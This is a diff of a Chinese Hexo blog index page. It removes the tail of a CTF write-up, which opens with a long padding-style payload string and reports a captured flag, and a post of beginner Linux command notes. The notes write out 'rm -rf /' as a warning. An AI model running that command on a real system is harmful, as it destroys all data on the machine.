AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>成功获取flag</p>
-<p>参考引用：<a target="_blank" rel="noopener" href="https://wp.n03tack.top/posts/62454/">https://wp.n03tack.top/posts/62454/</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-%E5%B1%82%E5%B1%82%E7%A9%BF%E9%80%8F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-linux笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/19/linux%E7%AC%94%E8%AE%B0/">linux笔记</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/19/linux%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2021-08-19T02:36:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>参考网页：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NTAzMTExNg==&amp;mid=2247483879&amp;idx=1&amp;sn=96181b566c35679e48db6bd26fb59a2c&amp;chksm=ce610744f9168e5254c0fec44d82a6d84d042e4f8febceb02f200d48e157724d2fa14d1a6498&amp;mpshare=1&amp;scene=23&amp;srcid=0804m6iIsc8cFN9vuvY1Q803&amp;sharer_sharetime=1628081308664&amp;sharer_shareid=c1177fe8f27bdd4322b62191a6954e71#rd">https://mp.weixin.qq.com/s?__biz=Mzg2NTAzMTExNg==&amp;mid=2247483879&amp;idx=1&amp;sn=96181b566c35679e48db6bd26fb59a2c&amp;chksm=ce610744f9168e5254c0fec44d82a6d84d042e4f8febceb02f200d48e157724d2fa14d1a6498&amp;mpshare=1&amp;scene=23&amp;srcid=0804m6iIsc8cFN9vuvY1Q803&amp;sharer_sharetime=1628081308664&amp;sharer_shareid=c1177fe8f27bdd4322b62191a6954e71#rd</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4dZ3mbu287pC6mdGOczGAA">https://mp.weixin.qq.com/s/4dZ3mbu287pC6mdGOczGAA</a></p>
-<p>解压：tar -zxvf (包名)<br>新建文件夹：mkdir (文件名)<br>ls：-ll(查看详细信息)<br>-al（查看全部文件，包括隐藏文件）<br>ls / :查看根目录</p>
-<p>linux中，没有错误（包括没有回显）就是成功的（linux中没有错误就是成功）</p>
-<p>以下是对这些目录的解释：<br>*<br>/bin：bin是Binary的缩写, 这个目录存放着最经常使用的命令。</p>
-<p>/boot： 这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。</p>
-<p>/dev ： dev是Device(设备)的缩写, 存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。<br>*<br>/etc： 这个目录用来存放所有的系统管理所需要的配置文件和子目录。<br>*<br>/home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</p>
-<p>/lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。<br>*<br>/lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。(存放突然关机的文件)</p>
-<p>/media：linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。</p>
-<p>/mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。<br>*<br>/opt：这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p>
-<p>/proc：这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>*<br>/root：该目录为系统管理员，也称作超级权限者的用户主目录。</p>
-<p>/sbin：s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。</p>
-<p>/srv：该目录存放一些服务启动之后需要提取的数据。</p>
-<p>/sys：这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。</p>
-<p>/tmp：这个目录是用来存放一些临时文件的。<br>*<br>/usr：这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</p>
-<p>/usr/bin： 系统用户使用的应用程序。</p>
-<p>/usr/sbin： 超级用户使用的比较高级的管理程序和系统守护程序。</p>
-<p>/usr/src： 内核源代码默认的放置目录。<br>*<br>/var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</p>
-<p>/run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。<br>*<br>/www: 与服务器相关的资源</p>
-<p>绝对路径：</p>
-<p>路径的写法，由根目录 / 写起，例如：/usr/share/doc 这个目录。</p>
-<p>相对路径：</p>
-<p>路径的写法，不是由 / 写起，例如由 /usr/share/doc 要到 /usr/share/man 底下时，可以写成：cd ../man 这就是相对路径的写法啦！</p>
-<p>几个常见的处理目录的命令吧：</p>
-<p>ls: 列出目录</p>
-<p>cd：切换目录</p>
-<p>pwd：显示目前的目录（可以看到绝对路径，用来确定位置）</p>
-<p>mkdir：创建一个新的目录</p>
-<p>rmdir：删除一个空的目录</p>
-<p>cp: 复制文件或目录</p>
-<p>rm: 移除文件或目录</p>
-<p>mv: 移动文件与目录，或修改文件与目录的名称</p>
-<p>你可以使用 man [命令] 来查看各个命令的使用文档，如 ：man cp。</p>
-<hr>
-<h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>选项与参数：</p>
-<p>-a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</p>
-<p>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)<br>(合起来：-al）</p>
-<hr>
-<h2 id="pwd-显示目前所在的目录"><a href="#pwd-显示目前所在的目录" class="headerlink" title="pwd ( 显示目前所在的目录 )"></a>pwd ( 显示目前所在的目录 )</h2><p>pwd 是 Print Working Directory 的缩写，也就是显示目前所在目录的命令。</p>
-<p>[root@kuangshen kuangstudy]#pwd [-P]<br>选项与参数：-P ：显示出确实的路径，而非使用连接(link) 路径。</p>
-<p>mkdir （创建新目录）</p>
-<p>如果想要创建新的目录的话，那么就使用mkdir (make directory)吧。</p>
-<hr>
-<h2 id="mkdir-mp-目录名称"><a href="#mkdir-mp-目录名称" class="headerlink" title="mkdir [-mp] 目录名称"></a>mkdir [-mp] 目录名称</h2><p>选项与参数：</p>
-<p>-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～</p>
-<p>-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！</p>
-<hr>
-<h2 id="rmdir-删除空的目录"><a href="#rmdir-删除空的目录" class="headerlink" title="rmdir ( 删除空的目录 )"></a>rmdir ( 删除空的目录 )</h2><p>语法：</p>
-<p>rmdir [-p] 目录名称<br>选项与参数：-p ：连同上一级『空的』目录也一起删除</p>
-<hr>
-<h2 id="cp-复制文件或目录"><a href="#cp-复制文件或目录" class="headerlink" title="cp ( 复制文件或目录 )"></a>cp ( 复制文件或目录 )</h2><p>语法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~]# cp [-adfilprsu] 来源档(source) 目标档(destination)</span><br><span class="line">[root@www ~]# cp [options] source1 source2 source3 .... directory</span><br></pre></td></tr></table></figure>
-<p>选项与参数：</p>
-<p>-a：相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用)</p>
-<p>-p：连同文件的属性一起复制过去，而非使用默认属性(备份常用)；</p>
-<p>-d：若来源档为连结档的属性(link file)，则复制连结档属性而非文件本身；</p>
-<p>-r：递归持续复制，用於目录的复制行为；(常用)</p>
-<p>-f：为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次；</p>
-<p>-i：若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用)</p>
-<p>-l：进行硬式连结(hard link)的连结档创建，而非复制文件本身。</p>
-<p>-s：复制成为符号连结档 (symbolic link)，亦即『捷径』文件；</p>
-<p>-u：若 destination 比 source 旧才升级 destination ！</p>
-<p>rm ( 移除文件或目录 )</p>
-<h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><h2 id="rm-fir-文件或目录"><a href="#rm-fir-文件或目录" class="headerlink" title="rm [-fir] 文件或目录"></a>rm [-fir] 文件或目录</h2><p>选项与参数：</p>
-<p>-f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；</p>
-<p>-i ：互动模式，在删除前会询问使用者是否动作</p>
-<p>-r ：递归删除啊！最常用在目录的删除了！这是非常危险的选项！！！</p>
-<h1 id="尽量不要在服务器上使用-rm-rf-（俗称“删库跑路”）"><a href="#尽量不要在服务器上使用-rm-rf-（俗称“删库跑路”）" class="headerlink" title="尽量不要在服务器上使用 rm -rf /   （俗称“删库跑路”）"></a>尽量不要在服务器上使用 rm -rf /   （俗称“删库跑路”）</h1><hr>
-<h2 id="mv-移动文件与目录，或修改名称"><a href="#mv-移动文件与目录，或修改名称" class="headerlink" title="mv  ( 移动文件与目录，或修改名称 )"></a>mv  ( 移动文件与目录，或修改名称 )</h2><p>语法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~]# mv [-fiu] source destination</span><br><span class="line">[root@www ~]# mv [options] source1 source2 source3 .... directory</span><br></pre></td></tr></table></figure>
-<p>选项与参数：</p>
-<p>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</p>
-<p>-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</p>
-<p>-u ：若目标文件已经存在，且 source 比较新，才会升级 (update)</p>
-<hr>
-<h2 id="使用ll或者ls-–l命令来显示一个文件的属性以及文件所属的用户和组"><a href="#使用ll或者ls-–l命令来显示一个文件的属性以及文件所属的用户和组" class="headerlink" title="使用ll或者ls –l命令来显示一个文件的属性以及文件所属的用户和组"></a>使用ll或者ls –l命令来显示一个文件的属性以及文件所属的用户和组</h2><p>在Linux中第一个字符代表这个文件是目录、文件或链接文件等等：</p>
-<p>当为[ d ]则是目录</p>
-<p>当为[ - ]则是文件；</p>
-<p>若是[ l ]则表示为链接文档 ( link file )；</p>
-<p>若是[ b ]则表示为装置文件里面的可供储存的接口设备 ( 可随机存取装置 )；</p>
-<p>若是[ c ]则表示为装置文件里面的串行端口设备，例如键盘、鼠标 ( 一次性读取装置 )。</p>
-<p>接下来的字符中，以三个为一组，且均为『rwx』 的三个参数的组合。</p>
-<p>其中，[ r ]代表可读(read)、[ w ]代表可写(write)、[ x ]代表可执行(execute)。</p>
-<p>要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号[ - ]而已。</p>
-<p>修改文件属性</p>
-<p>1、chgrp：更改文件属组</p>
-<p>chgrp [-R] 属组名 文件名<br>-R：递归更改文件属组，就是在更改某个目录文件的属组时，如果加上-R的参数，那么该目录下的所有文件的属组都会更改。</p>
-<p>2、chown：更改文件属主，也可以同时更改文件属组</p>
-<p>chown [–R] 属主名 文件名<br>chown [-R] 属主名：属组名 文件名<br>3、chmod：更改文件9个属性</p>
-<p>chmod [-R] xyz 文件或目录<br>Linux文件属性有两种设置方法，一种是数字，一种是符号。</p>
-<p>Linux文件的基本权限就有九个，分别是owner/group/others三种身份各有自己的read/write/execute权限。</p>
-<p>先复习一下刚刚上面提到的数据：文件的权限字符为：『-rwxrwxrwx』， 这九个权限是三个三个一组的！其中，我们可以使用数字来代表各个权限，各权限的分数对照表如下：</p>
-<p>r:4     w:2         x:1<br>每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为：[-rwxrwx—] 分数则是：</p>
-<p>owner = rwx = 4+2+1 = 7</p>
-<p>group = rwx = 4+2+1 = 7</p>
-<p>others= — = 0+0+0 = 0</p>
-<p>chmod 770 filename<br>可以自己下去多进行测试！</p>
-<hr>
-<h2 id="文件内容查看（都可以用来打开文件）"><a href="#文件内容查看（都可以用来打开文件）" class="headerlink" title="文件内容查看（都可以用来打开文件）"></a>文件内容查看（都可以用来打开文件）</h2><p>概述</p>
-<p>Linux系统中使用以下命令来查看文件的内容：</p>
-<p>cat 由第一行开始显示文件内容</p>
-<p>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！</p>
-<p>nl  显示的时候，顺道输出行号！</p>
-<p>more 一页一页的显示文件内容</p>
-<p>less 与 more 类似，但是比 more 更好的是，他可以往前翻页！</p>
-<p>head 只看头几行</p>
-<p>tail 只看尾巴几行</p>
-<h2 id="你可以使用-man-命令-来查看各个命令的使用文档，如-：man-cp。"><a href="#你可以使用-man-命令-来查看各个命令的使用文档，如-：man-cp。" class="headerlink" title="你可以使用 man [命令]来查看各个命令的使用文档，如 ：man cp。"></a>你可以使用 man [命令]来查看各个命令的使用文档，如 ：man cp。</h2><h2 id="cat-由第一行开始显示文件内容"><a href="#cat-由第一行开始显示文件内容" class="headerlink" title="cat 由第一行开始显示文件内容"></a>cat 由第一行开始显示文件内容</h2><p>语法：</p>
-<p>cat [-AbEnTv]<br>选项与参数：</p>
-<p>-A ：相当於 -vET 的整合选项，可列出一些特殊字符而不是空白而已；</p>
-<p>-b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！</p>
-<p>-E ：将结尾的断行字节 $ 显示出来；</p>
-<p>-n ：列印出行号，连同空白行也会有行号，与 -b 的选项不同；</p>
-<p>-T ：将 [tab] 按键以 ^I 显示出来；</p>
-<p>-v ：列出一些看不出来的特殊字符</p>
-<hr>
-<h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p>tac与cat命令刚好相反，文件内容从最后一行开始显示，可以看出 tac 是 cat 的倒着写</p>
-<hr>
-<h2 id="nl-显示行号"><a href="#nl-显示行号" class="headerlink" title="nl  显示行号"></a>nl  显示行号</h2><p>语法：</p>
-<p>nl [-bnw] 文件<br>选项与参数：</p>
-<p>-b ：指定行号指定的方式，主要有两种：-b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)；-b t ：如果有空行，空的那一行不要列出行号(默认值)；</p>
-<p>-n ：列出行号表示的方法，主要有三种：-n ln ：行号在荧幕的最左方显示；-n rn ：行号在自己栏位的最右方显示，且不加 0 ；-n rz ：行号在自己栏位的最右方显示，且加 0 ；</p>
-<p>-w ：行号栏位的占用的位数。</p>
-<hr>
-<table>
-<thead>
-<tr>
-<th>：管道符</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>A</td>
-</tr>
-<tr>
-<td>grep：查找文件中符合条件的字符串（和管道符共用很好用）</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="确保Linux的防火墙端口是开启的，如果是阿里云，需要保证阿里云的安全组策略是开放的！"><a href="#确保Linux的防火墙端口是开启的，如果是阿里云，需要保证阿里云的安全组策略是开放的！" class="headerlink" title="确保Linux的防火墙端口是开启的，如果是阿里云，需要保证阿里云的安全组策略是开放的！"></a>确保Linux的防火墙端口是开启的，如果是阿里云，需要保证阿里云的安全组策略是开放的！</h2><h1 id="查看firewall服务状态"><a href="#查看firewall服务状态" class="headerlink" title="查看firewall服务状态"></a>查看firewall服务状态</h1><p>systemctl status firewalld</p>
-<h1 id="开启、重启、关闭、firewalld-service服务"><a href="#开启、重启、关闭、firewalld-service服务" class="headerlink" title="开启、重启、关闭、firewalld.service服务"></a>开启、重启、关闭、firewalld.service服务</h1><h1 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h1><p>service firewalld start</p>
-<h1 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h1><p>service firewalld restart</p>
-<h1 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h1><p>service firewalld stop</p>
-<h1 id="查看防火墙规则"><a href="#查看防火墙规则" class="headerlink" title="查看防火墙规则"></a>查看防火墙规则</h1><p>firewall-cmd –list-all    # 查看全部信息<br>firewall-cmd –list-ports  # 只看端口信息</p>
-<h1 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h1><p>开端口命令：firewall-cmd –zone=public –add-port=80/tcp –permanent<br>重启防火墙：systemctl restart firewalld.service</p>
-<p>命令含义：<br>–zone #作用域<br>–add-port=80/tcp  #添加端口，格式为：端口/通讯协议<br>–permanent   #永久生效，没有此参数重启后失效</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/19/linux%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
     </nav>
   
 
